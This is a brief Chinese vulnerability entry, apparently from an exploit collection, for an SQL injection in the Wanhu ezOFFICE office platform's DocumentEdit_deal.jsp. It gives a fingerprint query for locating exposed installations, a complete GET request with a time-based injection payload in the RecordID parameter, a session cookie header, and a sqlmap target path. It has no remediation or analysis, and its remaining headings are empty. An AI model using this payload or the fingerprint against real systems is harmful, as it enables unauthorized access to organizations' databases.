# 万户协同办公平台ezofficeDocumentEdit_deal存在SQL注入漏洞

- **系统**：万户协同办公平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **关键头**：`Cookie: OASESSIONID=46B0991723119BE2033078E05CE02503; LocLan=zh_CN`

**请求体 / payload**
```

sqlmap
/defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=1
```

**其他**
- 万户协同办公平台ezoffice DocumentEdit\_deal 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice